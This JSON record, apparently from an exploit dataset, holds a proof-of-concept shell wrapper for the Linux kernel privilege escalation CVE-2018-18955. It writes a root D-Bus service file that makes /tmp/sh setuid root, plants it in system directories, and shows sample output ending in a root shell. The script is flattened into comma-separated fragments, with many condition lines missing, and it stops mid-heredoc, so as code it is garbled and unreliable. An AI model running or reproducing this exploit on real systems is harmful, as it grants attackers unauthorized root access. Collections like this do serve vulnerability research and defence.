{
    "text": "vul_name : Linux Kernel 4.15.x < 4.19.2 map_write (  ) CAP_SYS_ADMIN Local Privilege Escalation ( dbus Method )  ， vul_cve : CVE-2018-18955 ， vul_poc :  #  ! /bin/sh ，  # wrapper for Jann Horn's exploit for CVE-2018-18955 ，  # uses dbus service technique ，  # test @ linux-mint-19-2 :  ~ /kernel-exploits/CVE-2018-18955 $ ./exploit.dbus.sh ，  #  [  *  ] Compiling. ，  #  [  *  ] Creating /usr/share/dbus-1/system-services/org.subuid.Service.service. ，  #  [ . ] starting ，  #  [ . ] setting up namespace ，  #  [  ~  ] done , namespace sandbox set up ，  #  [ . ] mapping subordinate ids ，  #  [ . ] subuid : 165536 ，  #  [ . ] subgid : 165536 ，  #  [  ~  ] done , mapped subordinate ids ，  #  [ . ] executing subshell ，  #  [  *  ] Creating /etc/dbus-1/system.d/org.subuid.Service.conf. ，  #  [ . ] starting ，  #  [ . ] setting up namespace ，  #  [  ~  ] done , namespace sandbox set up ，  #  [ . ] mapping subordinate ids ，  #  [ . ] subuid : 165536 ，  #  [ . ] subgid : 165536 ，  #  [  ~  ] done , mapped subordinate ids ，  #  [ . ] executing subshell ，  #  [  *  ] Launching dbus service. ，  # Error org.freedesktop.DBus.Error.NoReply : Did not receive a reply. Possible causes include : the remote application did not send a reply , the message bus security policy blocked the reply , the reply timeout expired , or the network connection was broken. ，  #  [ + ] Success :  ，  # -rwsrwxr-x 1 root root 8384 Jan 4 18 : 31 /tmp/sh ，  #  [  *  ] Cleaning up. ，  #  [  *  ] Launching root shell : /tmp/sh ，  # root @ linux-mint-19-2 :  ~ /kernel-exploits/CVE-2018-18955 # id ，  # uid=0 ( root ) gid=0 ( root ) groups=0 ( root )  , 1001 ( test )  ， rootshell=\"/tmp/sh\" ， service=\"org.subuid.Service\" ， command_exists (  ) { ， command -v \" $ {1}\" >/dev/null 2>/dev/null ， } ， echo ' [ - ] gcc is not installed' ， exit 1 ， fi ， echo ' [ - ] dbus-send is not installed' ， exit 1 ， fi ， echo ' [ - ] newuidmap is not installed' ， exit 1 ， fi ， echo ' [ - ] newgidmap is not installed' ， exit 1 ， fi ， echo ' [ - ] working directory is not writable' ， exit 1 ， fi ， echo \" [  *  ] Compiling.\" ， echo 'Compiling subuid_shell.c failed' ， exit 1 ， fi ， echo 'Compiling gcc_subshell.c failed' ， exit 1 ， fi ， echo 'Compiling rootshell.c failed' ， exit 1 ， fi ， echo \" [  *  ] Creating /usr/share/dbus-1/system-services/ $ {service}.service.\" ， cat EOF > \" $ {service}.service\" ，  [ D-BUS Service ]  ， Name= $ {service} ， Exec=/bin/sh -c \"/bin/chown root : root $ {rootshell} ; /bin/chmod u+s $ {rootshell}\" ， User=root ， EOF ， echo \"cp $ {service}.service /usr/share/dbus-1/system-services/ $ {service}.service\" | ./subuid_shell ./subshell ， echo ' [ - ] Failed' ， /bin/rm \" $ {rootshell}\" ， exit 1 ， fi ， echo \" [  *  ] Creating /etc/dbus-1/system.d/ $ {service}.conf.\" ， cat EOF > \" $ {service}.conf\"",
    "time": "2019.08.01"
}